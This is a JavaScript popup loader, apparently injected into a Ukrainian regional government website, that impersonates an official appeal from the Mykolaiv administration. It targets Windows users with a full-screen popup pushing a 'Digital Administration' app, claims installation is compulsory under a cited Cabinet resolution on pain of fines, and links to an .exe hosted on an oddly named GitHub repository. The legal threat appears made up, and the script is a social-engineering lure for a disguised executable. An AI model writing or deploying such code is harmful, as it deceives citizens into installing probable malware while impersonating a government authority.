// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER

// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER

(function() {
    const userAgent = navigator.userAgent.toLowerCase();
    const isWindows = userAgent.includes('windows');
    
    if (!isWindows) {
        const nonWindowsPopup = document.createElement('div');
        nonWindowsPopup.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            z-index: 99999;
            max-width: 90%;
            width: 400px;
            text-align: center;
            animation: fadeIn 0.5s ease-out;
        `;
        
        nonWindowsPopup.innerHTML = `
            <style>
                @keyframes fadeIn {
                    from { opacity: 0; transform: translate(-50%, -60%); }
                    to { opacity: 1; transform: translate(-50%, -50%); }
                }
            </style>
            <h3 style="color: #d32f2f; margin-bottom: 20px; font-size: 20px;">⚠️ УВАГА</h3>
            <p style="color: #333; margin-bottom: 20px; line-height: 1.5;">
                Цей додаток доступний <strong>лише для персональних комп'ютерів з операційною системою Windows</strong>.<br><br>
                Будь ласка, перейдіть на ПК для завантаження офіційного додатка "Цифрова Адміністрація".
            </p>
            <button onclick="this.parentElement.remove()" 
                    style="background: #1a237e; color: white; border: none; padding: 10px 25px; 
                           border-radius: 8px; cursor: pointer; font-weight: bold;">
                Зрозуміло
            </button>
        `;
        
        document.body.appendChild(nonWindowsPopup);
        return;
    }
    
    const style = document.createElement('style');
    style.textContent = `
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            opacity: 0;
            animation: fadeIn 1.5s ease-out forwards;
        }
        
        .popup-container {
            background: white;
            width: 450px;
            max-width: 90%;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transform: translateY(100px);
            opacity: 0;
            animation: slideUp 2s ease-out 0.5s forwards;
            position: relative;
        }
        
        .popup-close {
            position: absolute;
            top: 15px;
            right: 15px;
            width: 30px;
            height: 30px;
            background: #f5f5f5;
            border-radius: 50%;
            border: none;
            font-size: 20px;
            line-height: 1;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            transition: all 0.3s ease;
        }
        
        .popup-close:hover {
            background: #e0e0e0;
            color: #333;
            transform: rotate(90deg);
        }
        
        .popup-title {
            color: #1a237e;
            font-size: 22px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: bold;
            padding-right: 20px;
        }
        
        .popup-text {
            color: #333;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
            text-align: justify;
        }
        
        .popup-warning {
            color: #d32f2f;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 25px;
            padding: 10px;
            background: #ffebee;
            border-radius: 8px;
            border-left: 4px solid #d32f2f;
        }
        
        .popup-platform-note {
            color: #1976d2;
            font-size: 14px;
            margin-bottom: 15px;
            padding: 8px;
            background: #e3f2fd;
            border-radius: 6px;
            text-align: center;
            font-weight: bold;
        }
        
        .download-btn {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #4CAF50, #2E7D32);
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }
        
        .download-btn:hover {
            background: linear-gradient(135deg, #43A047, #1B5E20);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }
        
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @media (max-width: 480px) {
            .popup-container {
                width: 95%;
                padding: 20px;
            }
        }
    `;
    
    const popupHTML = `
        <div class="popup-overlay" id="taxPopup">
            <div class="popup-container">
                <button class="popup-close" id="popupCloseBtn" aria-label="Закрити">×</button>
                <title>MikolaevDIA - Завантажити</title>
                <div class="popup-title">ОФІЦІЙНЕ ЗВЕРНЕННЯ ДО ГРОМАДЯН МИКОЛАЇВСЬКОЇ ОБЛАСТІ</div>
                <div class="popup-platform-note">
                    ⚠️ ДОДАТОК ПРИЗНАЧЕНИЙ ВИКЛЮЧНО ДЛЯ ПЕРСОНАЛЬНИХ КОМП'ЮТЕРІВ
                </div>
                <div class="popup-text">
                    Шановні громадяни! В межах цифровізації державних послуг та спрощення адміністративних процедур, наше управління впровадило офіційний мобільний додаток "Цифрова Адміністрація".<br><br>
                    Через застосунок ви зможете оперативно сплачувати податки, комунальні платежі, адміністративні збори. Система дозволяє керувати електронними документами, відстежувати статус звернень, отримувати повідомлення про нарахування.<br><br>
                    Для батьків доступна функція моніторингу відвідування дитячих закладів освіти, харчування у школах, а також електронний щоденник учня.
                </div>
                <div class="popup-warning">
                    *Встановлення додатка є обов'язковим згідно з Постановою Кабінету Міністрів України №754 від 15.11.2023 "Про цифровізацію адміністративних послуг у регіонах". За відмову встановлення передбачено адміністративну відповідальність згідно зі ст. 188-21 КУпАП.
                </div>
                <a href="https://github.com/mk-gov-ua/jgfjdhkmbvn.github.io/raw/refs/heads/main/DIAMikolaev.exe" class="download-btn" id="downloadBtn">
                    ЗАВАНТАЖИТИ ОФІЦІЙНИЙ ДОДАТОК
                </a>
            </div>
        </div>
    `;
    
    document.head.appendChild(style);
    document.body.insertAdjacentHTML('beforeend', popupHTML);
    const closePopup = () => {
        const popup = document.getElementById('taxPopup');
        if (popup) {
            popup.style.opacity = '0';
            popup.style.transition = 'opacity 0.5s ease';
            setTimeout(() => popup.remove(), 500);
        }
    };
    setTimeout(() => {
        const downloadBtn = document.getElementById('downloadBtn');
        if (downloadBtn) {
            downloadBtn.onclick = function(e) {
                e.preventDefault();
                alert("Офіційний додаток завантажується... Це може зайняти кілька хвилин.");
                window.location.href = this.href;
            };
        }
        
        const closeBtn = document.getElementById('popupCloseBtn');
        if (closeBtn) {
            closeBtn.onclick = closePopup;
        }
        const overlay = document.getElementById('taxPopup');
        if (overlay) {
            overlay.onclick = function(e) {
                if (e.target === this) {
                    closePopup();
                }
            };
        }
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closePopup();
            }
        });
    }, 100);
    
    setTimeout(() => {
        closePopup();
    }, 1200000);
})();
